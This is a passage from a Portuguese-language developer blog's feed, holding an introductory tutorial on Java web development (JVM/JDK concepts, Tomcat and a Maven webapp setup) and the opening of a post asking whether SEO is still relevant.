&lt;li&gt;&lt;a href="https://www.quora.com/Should-I-learn-JSP-and-servlets-in-2019"&gt;Quora: Should I learn JSP and servlets in 2019?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-is-servlet"&gt;Quora: What is servlet?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.thymeleaf.org/doc/articles/thvsjsp.html"&gt;Thymeleaf: Thymeleaf vs. JSP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/JavaServer_Pages"&gt;Wikipedia: JavaServer Pages&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Unified_Expression_Language"&gt;Wikipedia: Unified Expression Language&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="java"></category><category term="servlet"></category><category term="jsp"></category><category term="jstl"></category></entry><entry><title>Engatinhando em Java para a web - Parte 1</title><link href="https://klauslaube.com.br/2019/11/28/engatinhando-em-java-web-parte-1.html" rel="alternate"></link><published>2019-11-28T11:35:00-03:00</published><updated>2019-11-28T11:35:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-11-28:/2019/11/28/engatinhando-em-java-web-parte-1.html</id><summary type="html">&lt;p&gt;Uma constante nesses dois últimos anos da minha vida profissional tem sido "reavaliar" algumas opiniões que tive durante a minha carreira. Não à toa costumo escrever &lt;a href="https://klauslaube.com.br/2017/04/19/eu-me-rendo-material-design.html" title="Já me rendi até ao Material Design"&gt;alguns artigos do tipo "eu me rendo"&lt;/a&gt;. Já me rendi ao &lt;a href="https://klauslaube.com.br/2018/06/04/eu-me-rendo-vscode.html" title="Relato onde admito estar traindo o Vim"&gt;VS Code, ao uso de IDEs&lt;/a&gt;, e até mesmo ao &lt;em&gt;React&lt;/em&gt;. Agora chegou …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Uma constante nesses dois últimos anos da minha vida profissional tem sido "reavaliar" algumas opiniões que tive durante a minha carreira. Não à toa costumo escrever &lt;a href="https://klauslaube.com.br/2017/04/19/eu-me-rendo-material-design.html" title="Já me rendi até ao Material Design"&gt;alguns artigos do tipo "eu me rendo"&lt;/a&gt;. Já me rendi ao &lt;a href="https://klauslaube.com.br/2018/06/04/eu-me-rendo-vscode.html" title="Relato onde admito estar traindo o Vim"&gt;VS Code, ao uso de IDEs&lt;/a&gt;, e até mesmo ao &lt;em&gt;React&lt;/em&gt;. Agora chegou a hora do &lt;a href="https://klauslaube.com.br/tag/java.html" title="Leia mais sobre Java"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;&lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; ainda é de longe a minha linguagem favorita. Mas acabei "caindo de paraquedas" no mundo &lt;em&gt;Java&lt;/em&gt; (principal linguagem usada aqui na &lt;a href="https://tradeshift.com/" title="Reimagine procure-to-pay"&gt;&lt;em&gt;Tradeshift&lt;/em&gt;&lt;/a&gt;), e assim como o &lt;em&gt;Python&lt;/em&gt; enriqueceu o meu conhecimento quando me rendi a ele (minha primeira linguagem foi o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;), o &lt;em&gt;Java&lt;/em&gt; tem feito o mesmo.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/java-darth-vader.jpeg" width="740" height="463" title="Come join the dark side (craigblower.wordpress.com)" alt="Come join the dark side (craigblower.wordpress.com)"&gt;&lt;/p&gt;
&lt;p&gt;Após essa longa argumentação exibindo a motivação por trás desse &lt;em&gt;post&lt;/em&gt;, vamos ao que interessa: &lt;em&gt;Java&lt;/em&gt; para a &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; pode ser divertido...&lt;/p&gt;
&lt;p&gt;... só precisa ter um pouquinho de paciência.&lt;/p&gt;
&lt;h2&gt;Linguagem x Ambiente&lt;/h2&gt;
&lt;p&gt;Parece chover no molhado, mas quando falamos em &lt;em&gt;Java&lt;/em&gt; temos que levar sempre em consideração que estamos referenciando duas coisas: A linguagem de programação e a plataforma.&lt;/p&gt;
&lt;p&gt;Sobre a linguagem, é exatamente aquele mesmo discurso que a gente já está cansado de ouvir: Orientada a objetos, de alto nível, estática e de tipagem forte.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/java-luke-no.jpg" width="550" height="374" title="Noooooooooooooooooooooooo (starwarsanon.wordpress.com)" alt="Noooooooooooooooooooooooo (starwarsanon.wordpress.com)"&gt;&lt;/p&gt;
&lt;h3&gt;Plataformas e a sopa de letrinha&lt;/h3&gt;
&lt;p&gt;As plataformas &lt;em&gt;Java&lt;/em&gt; possuem a &lt;em&gt;Java Virtual Machine&lt;/em&gt; (&lt;em&gt;JVM&lt;/em&gt;) e uma &lt;em&gt;API&lt;/em&gt; (&lt;em&gt;Application Programming Interface&lt;/em&gt;). A primeira é quem "executa" aplicações &lt;em&gt;Java&lt;/em&gt; para uma determinada plataforma de &lt;em&gt;hardware&lt;/em&gt; e &lt;em&gt;software&lt;/em&gt;. Já a segunda é uma coleção de componentes usados para criação de outros componentes e aplicações.&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;Java Runtime Environment&lt;/em&gt; (&lt;em&gt;JRE&lt;/em&gt;) provê o ambiente necessário para executar aplicações &lt;em&gt;Java&lt;/em&gt;. Inclui implementação da &lt;em&gt;JVM&lt;/em&gt; juntamente com bibliotecas e outros arquivos necessários para sua execução.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/jre-diagram.png" width="619" height="364" title="Diagrama da relação entre a JRE e a JVM (javatpoint.com)" alt="Diagrama da relação entre a JRE e a JVM (javatpoint.com)"&gt;&lt;/p&gt;
&lt;p&gt;Para escrever código &lt;em&gt;Java&lt;/em&gt; utiliza-se um conjunto de ferramentas de desenvolvimento chamado de &lt;em&gt;Java Development Kit&lt;/em&gt; (&lt;em&gt;JDK&lt;/em&gt;). Entre essas ferramentas está o compilador, o &lt;em&gt;debugger&lt;/em&gt; &lt;em&gt;Java&lt;/em&gt;, e a própria &lt;em&gt;JRE&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/jdk-diagram.png" width="619" height="362" title="Diagrama da relação entre a JDK, JRE e a JVM (javatpoint.com)" alt="Diagrama da relação entre a JDK, JRE e a JVM (javatpoint.com)"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Java&lt;/em&gt; é uma linguagem de propósito genérico, portanto, há diferentes especificações (e fatalmente implementações) que auxiliam na construção de soluções para diferentes fins. As mais mencionadas sendo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Java Standard Edition (SE)&lt;/em&gt;: Disponibiliza as funcionalidades "core" da linguagem. De tipos básicos a classes de alto nível que lidam com &lt;em&gt;networking&lt;/em&gt;, segurança, &lt;em&gt;parsing&lt;/em&gt;, &lt;em&gt;math&lt;/em&gt;, entre outros. Além disso, consiste de máquina virtual, ferramentas de desenvolvimento, tecnologias de &lt;em&gt;deployment&lt;/em&gt;, etc;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Java Enterprise Edition (EE)&lt;/em&gt;: Construída em cima da anterior, disponibiliza &lt;em&gt;API&lt;/em&gt; e ambiente de execução para ambientes "enterprise" de larga escala e distruídos. Aqui encontraremos os componentes mais comuns para construção de aplicações &lt;em&gt;web&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Java Micro Edition (ME)&lt;/em&gt;: Também construída em cima da &lt;em&gt;SE&lt;/em&gt;, disponibiliza uma máquina virtual própria para dispositivos menores (como &lt;em&gt;smartphones&lt;/em&gt; e embarcados).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Confuso? Isso que &lt;a href="https://www.baeldung.com/oracle-jdk-vs-openjdk" title="Leia mais sobre no Baeldung"&gt;nem falamos de &lt;em&gt;OpenJDK&lt;/em&gt;&lt;/a&gt;...&lt;/p&gt;
&lt;h2&gt;Tudo começa pelo servidor de aplicação&lt;/h2&gt;
&lt;p&gt;O motivo no qual estamos lidando com essa quantidade de acrônimos é para compreendermos que, quando estamos falando do servidor de aplicações (que será o ambiente no qual executaremos a nossa aplicação &lt;em&gt;web&lt;/em&gt;), estamos falando do "domínio" do &lt;em&gt;Java EE&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Segundo a &lt;a href="https://www.caelum.com.br/apostila-java-web/o-que-e-java-ee/" title="Leia o trecho completo no material original"&gt;apostila de &lt;em&gt;Java&lt;/em&gt; para &lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, da &lt;em&gt;Caelum&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) o Java EE é um grande conjunto de especificações. Essas especificações, quando implementadas, vão auxiliar bastante o desenvolvimento da sua aplicação, pois você não precisará se preocupar com grande parte de código de infraestrutura, que demandaria muito trabalho.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ainda citando a fonte acima:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Existem diversas dessas implementações. Já que esse software tem papel de servir sua aplicação para auxiliá-la com serviços de infraestrutura, esse software ganha o nome de servidor de aplicação. A própria Sun/Oracle desenvolve uma dessas implementações, o Glassfish que é open source e gratuito (...).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Vamos utilizar uma ferramenta que implementa apenas parte da especificação do &lt;em&gt;Java EE&lt;/em&gt;, não sendo por definição um "servidor de aplicação completo", mas nem por isso deixando de atender nossos requisitos. No momento, só estamos interessados no &lt;em&gt;Java ServerPages&lt;/em&gt; (&lt;em&gt;JSP&lt;/em&gt;) e em &lt;em&gt;Servlets&lt;/em&gt;, e há um &lt;em&gt;software&lt;/em&gt; extremamente popular que entrega isso para a gente.&lt;/p&gt;
&lt;h3&gt;Tomcat&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Apache_Tomcat" title="Leia mais no artigo original"&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Apache Tomcat (sometimes simply "Tomcat") is an open source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies. (...) provides a "pure Java" HTTP web server environment in which Java code can run.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Exatamente o que precisamos!&lt;/p&gt;
&lt;p&gt;Instalá-lo é simples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Faça o &lt;em&gt;download&lt;/em&gt; no &lt;a href="https://tomcat.apache.org" title="Site oficial do Tomcat"&gt;tomcat.apache.org&lt;/a&gt;;&lt;/li&gt;
&lt;li&gt;Descompacte no diretório de sua preferência;&lt;/li&gt;
&lt;li&gt;Tenha certeza que o arquivo &lt;code&gt;startup.sh&lt;/code&gt; tem permissão de execução;&lt;/li&gt;
&lt;li&gt;Execute o arquivo;&lt;/li&gt;
&lt;li&gt;Abra o endereço &lt;code&gt;http://localhost:8080&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Se tudo estiver certo, você deve ver a mensagem em verde &lt;code&gt;If you're seeing this, you've successfully installed Tomcat. Congratulations!&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/tomcat-example.png" width="640" height="172" title="Exemplo de execução do Tomcat via terminal" alt="Exemplo de execução do Tomcat via terminal"&gt;&lt;/p&gt;
&lt;p&gt;Mas a maneira que considero mais prática é manuseá-lo através de alguma ferramenta de &lt;em&gt;build&lt;/em&gt;. No caso desse tutorial, usaremos o &lt;em&gt;Maven&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Não esqueça de desligar o &lt;em&gt;Tomcat&lt;/em&gt; através do &lt;code&gt;./shutdown.sh&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Maven&lt;/h3&gt;
&lt;p&gt;Com o &lt;em&gt;Maven&lt;/em&gt; você controlará grande parte do ciclo de vida da sua aplicação, resolvendo dependências, executando testes, compilando o projeto, etc. Com ele você pode também criar o projeto utilizando o arquétipo de &lt;em&gt;webapp&lt;/em&gt;, como ilustrado no exemplo abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mvn archetype:generate
    -DgroupId=com.kplaube
    -DartifactId=ola-mundo
    -DarchetypeArtifactId=maven-archetype-webapp
    -DinteractiveMode=false
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Onde:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-DgroupId&lt;/code&gt;: O &lt;em&gt;namespace&lt;/em&gt; utilizado para empacotamento&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-DartifactId&lt;/code&gt;: O nome do projeto&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-DarchetypeArtifactId&lt;/code&gt;: O nome do "template" usado como base para criar arquivos e diretórios&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-DinteractiveMode&lt;/code&gt;: Desabilitar o modo interativo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Uma porção de pacotes serão baixados. Sente e relaxe... aproveite para ver mais informações sobre &lt;a href="https://maven.apache.org/install.html" title="Installing Apache Maven"&gt;como instalar o &lt;em&gt;Maven&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ainda falta "linkar" o &lt;em&gt;Tomcat&lt;/em&gt; ao processo de &lt;em&gt;build&lt;/em&gt;. Entre no diretório &lt;code&gt;ola-mundo&lt;/code&gt;, recém criado, e abra o arquivo &lt;code&gt;pom.xml&lt;/code&gt; (&lt;em&gt;Project Object Model&lt;/em&gt;, arquivo utilizado pelo &lt;em&gt;Maven&lt;/em&gt;). Altere-o para ficar parecido com o exemplo abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;project&lt;/span&gt; &lt;span class="na"&gt;xmlns=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://maven.apache.org/POM/4.0.0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;
&lt;span class="na"&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;modelVersion&amp;gt;&lt;/span&gt;4.0.0&lt;span class="nt"&gt;&amp;lt;/modelVersion&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;com.kplaube&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;ola-mundo&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;packaging&amp;gt;&lt;/span&gt;war&lt;span class="nt"&gt;&amp;lt;/packaging&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.0-SNAPSHOT&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;name&amp;gt;&lt;/span&gt;ola-mundo Maven Webapp&lt;span class="nt"&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;url&amp;gt;&lt;/span&gt;http://maven.apache.org&lt;span class="nt"&gt;&amp;lt;/url&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;build&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;finalName&amp;gt;&lt;/span&gt;ola-mundo&lt;span class="nt"&gt;&amp;lt;/finalName&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;plugins&amp;gt;&lt;/span&gt;
            &lt;span class="c"&gt;&amp;lt;!-- Tomcat plugin --&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;plugin&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.tomcat.maven&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;tomcat7-maven-plugin&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;2.2&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;path&amp;gt;&lt;/span&gt;/&lt;span class="nt"&gt;&amp;lt;/path&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;webapps&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;webapp&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;contextPath&amp;gt;&lt;/span&gt;/&lt;span class="nt"&gt;&amp;lt;/contextPath&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;com.kplaube&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;ola-mundo&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.0-SNAPSHOT&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;type&amp;gt;&lt;/span&gt;war&lt;span class="nt"&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;asWebapp&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/asWebapp&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;/webapp&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;/webapps&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/plugin&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/plugins&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/build&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/project&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De volta à linha de comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mvn tomcat7:run
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;Maven&lt;/em&gt; "baixará toda a &lt;em&gt;internet&lt;/em&gt;" novamente. Ao final do processo, ao acessar o endereço &lt;code&gt;http://localhost:8080&lt;/code&gt;, será possível ver a página com &lt;code&gt;Hello World!&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/tomcat-example-browser.png" width="640" height="420" title="Exemplo de acesso ao Tomcat via browser" alt="Exemplo de acesso ao Tomcat via browser"&gt;&lt;/p&gt;
&lt;p&gt;"Só" precisou de um &lt;em&gt;post&lt;/em&gt; inteiro para chegarmos até aqui. Sucesso!&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Um monte de mágica aconteceu, e você (assim como eu no meu cotidiano) terá que confiar que as coisas simplesmente estão funcionando.&lt;/p&gt;
&lt;p&gt;Por enquanto, vamos abstrair os detalhes do &lt;em&gt;Maven&lt;/em&gt;. Corremos um pouco aqui no final para ter algo prático como exemplo, mas com certeza abordaremos a ferramenta com frequência nos próximos &lt;em&gt;posts&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Por hora, é preciso "aceitar" que com o uso do &lt;code&gt;tomcat7-maven-plugin&lt;/code&gt; ganhamos o utilitário de linha de comando &lt;code&gt;tomcat7:run&lt;/code&gt;, do qual empacota e executa a aplicação. E embora tenhamos investido parágrafos falando de &lt;em&gt;Java EE&lt;/em&gt;, e posteriormente de &lt;em&gt;Tomcat&lt;/em&gt;, na prática nota-se que pouco precisamos nos importar com isso para ter um "hello world" &lt;em&gt;up and runnig&lt;/em&gt; com "investimento modesto".&lt;/p&gt;
&lt;p&gt;No próximo artigo partiremos enfim para os &lt;em&gt;Servlets&lt;/em&gt; e &lt;em&gt;Java ServerPages&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até lá!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.caelum.com.br/apostila-java-web/o-que-e-java-ee/"&gt;Caelum: Apostila Java para Desenvolvimento Web - O que é Java EE?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.javatpoint.com/difference-between-jdk-jre-and-jvm"&gt;JavaTPoint: Difference between JDK, JRE, and JVM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.oracle.com/javaee/6/firstcup/doc/gkhoy.html"&gt;Oracle.com: Differences between Java EE and Java SE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://spsarolkar.github.io/esp8266/2018/03/18/Run-webapplications-using-tomcat-maven-plugin.html"&gt;spsarolkar.github.io: Running web applications with tomcat maven plugin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/1900673/can-javase-be-used-to-write-a-web-application#1900693"&gt;StackOverflow: Can JavaSE be used to write a web application?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/2857376/difference-between-java-se-ee-me"&gt;StackOverflow: Difference between Java SE/EE/ME?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Java_%28programming_language%29"&gt;Wikipedia: Java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Apache_Maven"&gt;Wikipedia: Maven&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Apache_Tomcat"&gt;Wikipedia: Tomcat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="java"></category><category term="servlet"></category></entry><entry><title>SEO ainda é relevante?</title><link href="https://klauslaube.com.br/2019/08/20/seo-ainda-e-relevante.html" rel="alternate"></link><published>2019-08-20T16:05:00-03:00</published><updated>2019-08-20T16:05:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-08-20:/2019/08/20/seo-ainda-e-relevante.html</id><summary type="html">&lt;p&gt;Se há uma constante em desenvolvimento de &lt;em&gt;software&lt;/em&gt; é o &lt;a href="https://www.significados.com.br/hype/" title="Significado de hype"&gt;&lt;em&gt;hype&lt;/em&gt;&lt;/a&gt;. Hoje vivemos o &lt;em&gt;buzz&lt;/em&gt;
ao redor de &lt;em&gt;microservices&lt;/em&gt;, &lt;em&gt;machine learning&lt;/em&gt; e &lt;em&gt;blockchain&lt;/em&gt;. Mas há algum tempo um dos &lt;em&gt;hypes&lt;/em&gt; que varreu o mundo do desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; foi o &lt;em&gt;SEO&lt;/em&gt; (ou &lt;em&gt;Search Engine Optimization&lt;/em&gt;).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Quem aqui nunca fez um freela …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Se há uma constante em desenvolvimento de &lt;em&gt;software&lt;/em&gt; é o &lt;a href="https://www.significados.com.br/hype/" title="Significado de hype"&gt;&lt;em&gt;hype&lt;/em&gt;&lt;/a&gt;. Hoje vivemos o &lt;em&gt;buzz&lt;/em&gt;
ao redor de &lt;em&gt;microservices&lt;/em&gt;, &lt;em&gt;machine learning&lt;/em&gt; e &lt;em&gt;blockchain&lt;/em&gt;. Mas há algum tempo um dos &lt;em&gt;hypes&lt;/em&gt; que varreu o mundo do desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; foi o &lt;em&gt;SEO&lt;/em&gt; (ou &lt;em&gt;Search Engine Optimization&lt;/em&gt;).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Quem aqui nunca fez um freela de "otimização para mecanismos de buscas" que atire a primeira pedra.&lt;/p&gt;
&lt;h2&gt;Eu (ainda) preciso me importar com SEO?&lt;/h2&gt;
&lt;p&gt;Essa pergunta tem rondado a minha cabeça nos últimos meses...&lt;/p&gt;
&lt;p&gt;(Infelizmente) tenho me distanciado cada vez mais do desenvolvimento utilizando &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, e portanto, a oportunidade de escrever sobre a linguagem tem diminuído consideravelmente. Logo, o título da página inicial "Python, Django e desenvolvimento" começa a perder o sentido.&lt;/p&gt;
&lt;p&gt;Você pode me sugerir: É só colocar uma &lt;em&gt;metatag&lt;/em&gt; &lt;code&gt;robots&lt;/code&gt; com &lt;code&gt;noindex,follow&lt;/code&gt;, e &lt;a href="http://dan-nolan.com/what-is-noindex/" title="What is noindex / follow?"&gt;fazer com que os robôs indexem apenas as páginas de artigos&lt;/a&gt;; E aí vem a minha pergunta: Em 2019, ainda precisamos dizer para os mecanismos de busca como eles devem se comportar?&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Long story short&lt;/em&gt;: Sim.&lt;/p&gt;
&lt;h2&gt;Recapitulando: SEO - Search Engine Optimization&lt;/h2&gt;
&lt;p&gt;Fui na segunda página dos resultados de busca do &lt;a href="https://duckduckgo.com/" title="The search engine that doesn't track you"&gt;DuckDuckGo&lt;/a&gt; para achar uma &lt;a href="https://resultadosdigitais.com.br/especiais/o-que-e-seo/" title="Tudo sobre Search Engine Optimization"&gt;boa definição de &lt;em&gt;SEO&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Como a própria tradução já sugere, SEO é uma otimização para os motores de busca, isto é, um conjunto de técnicas que influenciam os algoritmos dos buscadores a definir o ranking de uma página para determinada palavra-chave que foi pesquisada.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Os sites de buscas (como &lt;em&gt;Google&lt;/em&gt;), de forma bem genérica, utilizam um processo composto por três passos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Rastreamento: Onde o robô identifica e prioriza as páginas que devem ser indexadas;&lt;/li&gt;
&lt;li&gt;Indexação: São armazenadas informações como conteúdo da página, data de publicação, região da publicação, título, descrição, etc;&lt;/li&gt;
&lt;li&gt;Exibição de resultados: A consulta realizada pelo usuário, sendo que o resultado é alterado de acordo com a relevância da busca.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/seo-crawlers.jpg" width="740" height="463" title="Quando falam em robôs de busca, eu imagino os robôs do filme Chappie (wearemoviegeeks.com)" alt="Quando falam em robôs de busca, eu imagino os robôs do filme Chappie (wearemoviegeeks.com)"&gt;&lt;/p&gt;
&lt;p&gt;O trabalho do profissional de &lt;em&gt;SEO&lt;/em&gt; tem sido fazer com que determinado conteúdo seja encontrado pelos robôs de busca, bem como que ele ganhe prioridade e relevância, dado um contexto de busca. Além disso, facilitar a indexação proporcionando um conteúdo acessível e bem estruturado faz parte desse esforço.&lt;/p&gt;
